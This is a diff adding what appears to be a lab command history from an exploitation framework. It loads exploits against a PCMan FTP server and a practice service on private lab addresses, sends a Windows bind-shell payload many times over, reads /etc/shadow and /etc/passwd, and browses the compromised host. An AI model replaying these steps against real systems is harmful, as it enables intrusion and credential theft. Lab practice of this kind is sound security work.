@@ -12,4 +12,59 @@ hostname
 ifconfig
 cat /etc/passwd
 cat /etc/shadow
-load linux_x64_ovrflwmyechosrv
+load pwnmeserver_x64
+pwn scripter linux_displaypwnedmsgbox rhost 192.168.56.101 rport 1025
+whoami
+cat /etc/shadow
+load pwnmeserver_x64
+pwn scripter linux_displaypwnedmsgbox rhost 192.168.56.101 rport 1025
+load winxp_x86_pcmanftpserver
+set rhost 192.168.56.102
+set rport 139
+load winxp_x86_pcmanftpserver
+set rhost 192.168.56.102
+set rport 139
+show payloads
+pwn payload bind/windows_x86
+load winxp_x86_pcmanftpserver
+pwn payload bind/windows_x86 rhost 192.168.56.102 rport 21
+load winxp_x86_pcmanftpserver
+pwn payload bind/windows_x86 rhost 192.168.56.102 rport 21
+load winxp_x86_pcmanftpserver
+pwn payload bind/windows_x86 rhost 192.168.56.102 rport 21
+load winxp_x86_pcmanftpserver
+pwn payload bind/windows_x86 rhost 192.168.56.102 rport 21
+load winxp_x86_pcmanftpserver
+pwn payload bind/windows_x86 rhost 192.168.56.102 rport 21
+load winxp_x86_pcmanftpserver
+pwn payload bind/windows_x86 rhost 192.168.56.102 rport 21
+load winxp_x86_pcmanftpserver
+pwn payload bind/windows_x86 rhost 192.168.56.102 rport 21
+load winxp_x86_pcmanftpserver
+pwn payload bind/windows_x86 rhost 192.168.56.102 rport 21
+load winxp_x86_pcmanftpserver
+pwn payload bind/windows_x86 rhost 192.168.56.102 rport 21
+load winxp_x86_pcmanftpserver
+pwn payload bind/windows_x86 rhost 192.168.56.102 rport 21
+load winxp_x86_pcmanftpserver
+pwn payload bind/windows_x86 rhost 192.168.56.102 rport 21
+load winxp_x86_pcmanftpserver
+pwn payload bind/windows_x86 rhost 192.168.56.102 rport 21
+dir
+ls
+cd C:\
+dir
+pwd
+cd C:\Documents
+cd C:\Users
+cd C:\Desktop
+cd C:\Documents and Settings
+dir
+exit
+load winxp_x86_pcmanftpserver
+pwn payload bind/windows_x86 rhost 192.168.56.102 rport 21
+dir
+hostname
+whoami
+echo %USERDOMAIN%\%USERNAME%
+Start "" "%ProgramFiles%\Internet Explorer\iexplore.exe" "www.google.com"
